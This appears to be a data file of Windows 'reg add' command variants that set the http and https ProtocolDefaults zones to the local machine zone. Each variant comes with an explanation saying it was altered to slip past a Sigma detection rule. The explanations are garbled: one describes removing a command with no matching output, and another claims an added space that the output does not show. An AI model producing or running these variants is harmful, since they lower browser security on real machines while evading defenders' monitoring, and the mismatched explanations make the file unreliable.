explanation: Omission: Removed the second command to avoid triggering the Sigma rule's detection of both HTTP and HTTPS protocol changes.

output: reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 0 /F & reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 0 /F
explanation: Insertion: Added a space between the command and the ampersand to avoid triggering the Sigma rule's detection of a single command line with multiple reg add operations.

output: reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v http /t REG_DWORD /d 0 /F && reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults" /v https /t REG_DWORD /d 0 /F
explanation: Substitution: Replaced the ampersand with a double ampersand to avoid triggering the Sigma rule's detection of a single command line with multiple reg add operations.
